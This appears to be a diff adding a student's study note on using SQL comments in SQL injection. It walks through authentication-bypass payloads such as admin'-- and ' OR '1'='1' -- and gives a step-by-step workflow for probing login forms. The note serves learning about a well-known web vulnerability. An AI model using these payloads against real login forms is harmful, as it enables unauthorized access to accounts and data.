@@ -1,0 +1,126 @@
+🔍 SQL Comments in Injections – Breakdown
+🧠 Core Concept:
+SQL comments can be used to truncate (ignore) the rest of a legitimate SQL query after your injection — effectively cutting off checks like the password or conditions like AND id > 1.
+
+🔧 Types of SQL Comments:
+Type	Syntax	Usage Notes
+Line comment	--	Most common in SQLi. Needs a space after the dashes (-- ).
+Line comment	#	Alternative, but be careful: browsers treat # as an anchor. Use %23 URL encoded.
+Block comment	/* comment */	Rarely used in basic SQLi. Could be useful for multiline or conditional injection.
+🚪 Auth Bypass Using Comments – Workflow:
+✅ If you know a valid username:
+Inject something like:
+
+sql
+Copy
+Edit
+admin'-- 
+Query becomes:
+
+sql
+Copy
+Edit
+SELECT * FROM logins WHERE username='admin'-- ' AND password='wrong';
+➡ -- comments out everything after 'admin'
+➡ Password check is ignored, and the query returns the admin row.
+
+❌ If parentheses are used in the SQL logic:
+Query structure might be:
+
+sql
+Copy
+Edit
+SELECT * FROM logins WHERE (username='admin' AND id > 1) AND password='xyz';
+✅ In this case, use:
+
+sql
+Copy
+Edit
+admin')-- 
+➡ Closes the open paren, then comments out the rest
+➡ Final query becomes:
+
+sql
+Copy
+Edit
+SELECT * FROM logins WHERE (username='admin')
+💡 Bonus Notes:
+If password gets hashed before query execution, injecting in the password field becomes useless. You must inject in the username field instead.
+
+Always balance parentheses or quotes if needed.
+
+-- needs a space or + (URL encoded space) after it.
+
+URL encoding is required when sending payloads in GET params via browser address bar.
+
+🧠 Mental “If This, Then That” Flow:
+If there's a login form → Try ' OR '1'='1 or admin'--
+
+If SQL errors are shown → You’re probably in
+
+If parenthesis are in the original query → Close them with ')--
+
+If you get syntax error → You're missing a quote or paren
+
+If password hash changes input → Focus injection on username only
+
+
+  ✅ Step-by-Step Mindset:
+🧠 1. Test for Injection with a single '
+Input something like:
+
+vbnet
+Copy
+Edit
+' 
+This is to check: Does the backend query break with an unbalanced quote?
+
+If you see an SQL error like:
+
+nginx
+Copy
+Edit
+You have an error in your SQL syntax...
+🔥 That’s a green flag — it's vulnerable.
+
+🧠 2. Try to Subvert Logic
+Now you try something like:
+
+bash
+Copy
+Edit
+' OR '1'='1
+But if the page still throws an error or fails to log in, it's likely because the rest of the query after your input is still being evaluated and causing issues.
+
+🧠 3. Bring in SQL Comments
+This is when you follow up with:
+
+matlab
+Copy
+Edit
+' OR '1'='1' -- 
+Or:
+
+csharp
+Copy
+Edit
+' OR '1'='1' # 
+The comment (-- or #) tells the DB to ignore everything after it, including whatever is meant to close the query or check the password.
+
+Now the query becomes:
+
+sql
+Copy
+Edit
+SELECT * FROM logins WHERE username = '' OR '1'='1' -- ' AND password = 'anything'
+✅ It ends cleanly and evaluates to TRUE.
+
+🧠 TL;DR Workflow
+Step	What You Input	What You Look For
+1️⃣	'	SQL syntax error
+2️⃣	' OR '1'='1	Login success or error
+3️⃣	' OR '1'='1' --	Clean bypass
+4️⃣	' OR '1'='1') --	Use if parens are in the query
+
+
+  
